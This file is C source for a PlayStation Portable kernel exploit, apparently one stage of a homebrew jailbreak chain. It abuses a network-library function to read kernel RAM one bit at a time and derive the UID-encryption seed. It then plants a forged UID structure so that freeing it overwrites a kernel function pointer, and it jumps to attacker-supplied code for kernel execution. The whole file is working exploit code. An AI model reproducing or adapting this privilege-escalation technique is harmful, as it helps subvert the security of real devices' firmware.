#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

/*
SceUID kernel exploit and read-only exploit by qwikrazor87.
Part of Trinity exploit chain by thefl0w.
Put together by Acid_Snake and meetpatty.
*/

#define LIBC_CLOCK_OFFSET_660  0x88014400
#define LIBC_CLOCK_OFFSET_360  0x88014D80
#define LIBC_CLOCK_OFFSET_365  0x88014D00
#define SYSMEM_SEED_OFFSET_365 0x88014E38
#define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8

#define TYPE_UID_OFFSET_660 0x880164c0
#define TYPE_UID_OFFSET_360 0x88016dc0

#define FAKE_UID_OFFSET        0x80

UserFunctions* g_tbl = NULL;
//int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);

/* Actual code to trigger the kram read vulnerability.
    We can read the value stored at any location in Kram.
*/
static volatile int running;
static volatile int idx;
static int input[3];
static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;

static int racer(SceSize args, void *argp) {
  running = 1;

  while (running) {
    input[1] = 0;
    g_tbl->KernelDelayThread(10);
    input[1] = idx;
    g_tbl->KernelDelayThread(10);
  }

  return g_tbl->KernelExitDeleteThread(0);
}
/*u32 readKram(u32 addr){
  SceUID thid = g_tbl->KernelCreateThread("", racer, 8, 0x1000, 0, NULL);
  if (thid < 0)
    return 0;

  g_tbl->KernelStartThread(thid, 0, NULL);

  char string[8];
  int round = 0;

  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))

  int i;
  for (i = 0; i < 100000; i++) {
    u32 res = _sceNpCore_8AFAB4A0(input, string, sizeof(string));
    if (res != 5 && res != 0x80550203) {
      switch (round) {
        case 0:
          round = 1;
          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
          break;
        case 1:
          running = 0;
          return res;
      }
    }
  }

  running = 0;
  return 0;
}
*/
int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
	uint32_t a0[7];
	a0[0] = addr - 12;
	a0[3] = seed + 1; // (int)a0[3] must be < (int)a1
	a0[4] = 0x20000; // a0[4] must be = 0x20000
	a0[6] = seed; // (int)a0[6] must be < (int)a0[3]
	uint32_t a1 = value + seed + 1;
	uint32_t a2 = 0; // a2 must be <= 0
	uint32_t a3 = 1; // a3 must be > 0
	_sceNetMCopyback_1560F143(a0, a1, a2, a3);
	return a0[6] != seed;
}

// input: 4-byte-aligned kernel address to a non-null positive 32-bit integer
// return *addr >= value;
int is_ge_pos(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0xFFFFFFFF);
}

// input: 4-byte-aligned kernel address to a non-null negative 32-bit integer
// return *addr <= value;
int is_le_neg(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0x80000000);
}

// input: 4-byte-aligned kernel address to a non-null 32-bit integer
// return (int)*addr > 0
int is_positive(uint32_t addr) {
	return is_ge_pos(addr, 1);
}
u32 readKram(u32 addr) {
	unsigned int res = 0;
	int bit_idx = 1;
	if (is_positive(addr)) {
		for (; bit_idx < 32; bit_idx++) {
			unsigned int value = res | (1 << (31 - bit_idx));
			if (is_ge_pos(addr, value))
				res = value;
		}
		return res;
	}
	res = 0x80000000;
	for (; bit_idx < 32; bit_idx++) {
		unsigned int value = res | (1 << (31 - bit_idx));
		if (is_le_neg(addr, value))
			res = value;
	}
	if (res == 0xFFFFFFFF)
		res = 0;
	return res;


}

void repairInstruction(KernelFunctions* k_tbl) {
  /*
    SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
    _sw(mod->text_addr + 0x3904, libc_clock_offset);
    k_tbl->KernelIcacheInvalidateAll();
    k_tbl->KernelDcacheWritebackInvalidateAll(); 
  */
}

int stubScanner(UserFunctions* tbl){
    int res = 0;
    g_tbl = tbl;
    tbl->freeMem(tbl);

    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
    //_sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
	_sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);

    return 0;
}

/*
FakeUID kxploit
*/

int doExploit(void) {

    int res;
    u32 seed = 0;
    u32 type_uid = TYPE_UID_OFFSET_360;

    //if (_sceNpCore_8AFAB4A0 != NULL){
    if (_sceNetMCopyback_1560F143 != NULL){
      u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
	  PRTSTR1("test_val: 0x%p", test_val);
      if (test_val == 0x8F154E38){
        seed = readKram(SYSMEM_SEED_OFFSET_365);
        libc_clock_offset = LIBC_CLOCK_OFFSET_365;
	  	PRTSTR1("test_val: 0x%p", test_val);
      }
      else if (test_val == 0x8FBF003C){
        libc_clock_offset = LIBC_CLOCK_OFFSET_660;
        type_uid = TYPE_UID_OFFSET_660;
      }
    }

    // Allocate dummy block to improve reliability
    char dummy[32];
    memset(dummy, 'a', sizeof(dummy));
    SceUID dummyid;
    for (int i=0; i<10; i++)
      dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
      //g_tbl->KernelDcacheWritebackAll();

    // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
    u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
    u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
    SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
    SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A

    // Plant UID data structure into kernel as string
    u32 string[] = { libc_clock_offset - 4, 0x88888888, type_uid, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);

    g_tbl->KernelDcacheWritebackAll();

    // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
    res = g_tbl->KernelFreePartitionMemory(uid);

    g_tbl->KernelDcacheWritebackAll();

   
    if (res < 0) return res;

    return 0;
}

void executeKernel(u32 kernelContentFunction){
  // Make a jump to kernel function
  _sw(JUMP(KERNELIFY(kernelContentFunction)), 0x08888888);
  _sw(NOP, 0x08888888+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}
